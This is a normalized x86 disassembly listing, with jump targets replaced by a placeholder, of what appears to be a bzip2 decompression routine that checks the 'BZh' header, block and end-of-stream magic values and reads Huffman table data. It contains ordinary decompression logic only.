cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] ecx
jl r-xdata
cmp [ ebx + 0x20 ] 0x1
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
cmp [ ebx + 0x20 ] 0x8
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x42
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x5a
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x68
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp eax 0x31
mov [ ebx + 0x24 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x17
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x41
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x59
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x26
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x53
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x59
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc58 ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
and [ ebx + 0x34 ] 0x0
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x10 ] al
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
mov ecx [ ebx + 0x34 ]
add edx 0xfffffff8
shl ecx 0x8
and eax edi
movzx eax al
or ecx eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
mov ecx [ ebx + 0x34 ]
add edx 0xfffffff8
shl ecx 0x8
and eax edi
movzx eax al
or ecx eax
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x34 ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ ebx + 0x1c ]
lea ecx [ eax - 0x8 ]
shr edx cl
add eax 0xfffffff8
mov [ ebx + 0x20 ] eax
mov eax [ ebx + 0x34 ]
and edx edi
movzx ecx dl
shl eax 0x8
or eax ecx
mov [ ebx + 0x34 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x10 ]
and eax 0x1
dec edx
cmp al 0x1
sete al
inc [ ebp - 0x10 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + ecx + 0xd6c ] al
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
cmp al 0x1
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x3 ]
shr eax cl
add edx 0xfffffffd
mov [ ebx + 0x20 ] edx
and eax 0x7
cmp eax 0x2
mov [ ebp - 0x44 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0xf ]
shr eax cl
add edx 0xfffffff1
mov [ ebx + 0x20 ] edx
and eax 0x7fff
cmp eax 0x1
mov [ ebp - 0x50 ] eax
jl r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
and eax 0x1
dec edx
mov [ ebx + 0x20 ] edx
test al al
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x5 ]
shr eax cl
add edx 0xfffffffb
mov [ ebx + 0x20 ] edx
and eax 0x1f
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
sub edx esi
xor edi edi
mov ecx edx
shr eax cl
inc edi
mov ecx esi
shl edi cl
dec edi
and eax edi
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
mov esi [ ebp - 0x14 ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
or ecx eax
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x2c ] ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esi [ ebp - 0x14 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
sub edx esi
xor edi edi
mov ecx edx
shr eax cl
inc edi
mov ecx esi
shl edi cl
dec edi
and eax edi
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
mov esi [ ebp - 0x14 ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
mov [ ebp - 0x6c ] eax
or eax ecx
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
sub edx [ ebp - 0x14 ]
mov eax [ ebx + 0x1c ]
xor esi esi
mov ecx edx
shr eax cl
mov ecx [ ebp - 0x14 ]
inc esi
shl esi cl
dec esi
and eax esi
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x1 ]
shr eax cl
mov ecx [ ebp - 0x2c ]
add ecx ecx
and eax 0x1
dec edx
mov [ ebp - 0x6c ] eax
or eax ecx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x72
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x45
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x38
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x50
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
and eax edi
cmp al 0x90
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
lea ecx [ edx - 0x8 ]
shr eax cl
add edx 0xfffffff8
mov [ ebx + 0x20 ] edx
lea ecx [ ebx + 0xc5c ]
mov edx [ ecx ]
and eax edi
movzx eax al
shl edx 0x8
or edx eax
mov [ ecx ] edx
mov [ ebx + 0x4 ] 0x1
push 0x4
jmp r-xdata
xor eax eax
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0xfffffffb
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp eax 0x39
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp al 0x31
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0xfffffffc
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x2c ]
cmp [ ebx + 0x30 ] 0x2
mov eax [ ebx + 0x2c ]
jl r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
add ecx 0xa
cmp eax ecx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
push 0x100
lea eax [ ebx + 0xc6c ]
push 0x0
push eax
call sub_10024b80
add esp 0xc
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x1c ]
shl eax 0x4
add eax ebx
mov [ eax + ecx + 0xc6c ] 0x1
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp eax 0x6
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x44 ]
jl r-xdata
mov ecx [ ebp - 0x10 ]
mov al [ ebp - 0x1c ]
inc [ ebp - 0x10 ]
mov [ ebx + ecx + 0x650e ] al
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec [ ebp - 0x34 ]
inc [ ebp - 0x34 ]
jmp r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
imul eax eax 0x102
mov cl [ ebp - 0x34 ]
add eax ebx
inc [ ebp - 0x10 ]
mov [ eax + edx + 0xab60 ] cl
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x60 ]
jl r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp esi 0x14
mov [ ebx + 0x20 ] edx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x2c ]
cmp eax [ ecx + esi * 4 ]
jle r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x48 ]
cmp eax [ ecx + esi * 4 ]
jle r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp esi 0x14
mov [ ebp - 0x2c ] eax
mov [ ebx + 0x20 ] edx
jg r-xdata
mov esi [ eax ]
movzx esi [ esi ]
mov edx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl edx 0x8
or edx esi
mov [ ebx + 0x1c ] edx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x14
mov [ ebp - 0x2c ] eax
mov [ ebx + 0x20 ] edx
jg r-xdata
mov edx [ eax ]
movzx edx [ edx ]
mov ecx [ ebx + 0x1c ]
add [ ebx + 0x20 ] 0x8
shl ecx 0x8
or ecx edx
mov [ ebx + 0x1c ] ecx
inc [ eax ]
mov eax [ ebx ]
dec [ eax + 0x4 ]
mov eax [ ebx ]
inc [ eax + 0x8 ]
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x48 ]
shl ecx 0x2
cmp eax [ ecx + edx ]
jg r-xdata
mov edx [ eax ]
